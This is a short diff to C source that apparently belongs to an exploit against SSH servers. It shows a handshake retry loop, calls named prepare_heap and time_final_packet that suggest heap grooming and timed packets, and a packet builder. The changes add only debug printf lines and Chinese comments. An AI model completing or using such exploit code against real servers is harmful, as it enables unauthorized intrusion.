@@ -116,13 +116,14 @@ main (int argc, char *argv[])
                        attempt);
               continue;
             }
-
+printf("119");
           if (perform_ssh_handshake (sock) < 0)                           //ssh握手，换版本，换kex init
             {
               fprintf (stderr, "SSH handshake failed, attempt %d\n", attempt);
               close (sock);
               continue;
             }
+            printf("126");
 
           prepare_heap (sock);   //
           time_final_packet (sock, &parsing_time);
@@ -289,8 +290,8 @@ send_packet (int sock, unsigned char packet_type, const unsigned char *data,
   packet[1] = (packet_len >> 16) & 0xFF;
   packet[2] = (packet_len >> 8) & 0xFF;
   packet[3] = packet_len & 0xFF;
-  packet[4] = packet_type;
-
+  packet[4] = packet_type;                      //长度和模式放入前五个字节。
+  
   memcpy (packet + 5, data, len);
 
   if (send (sock, packet, packet_len, 0) < 0)
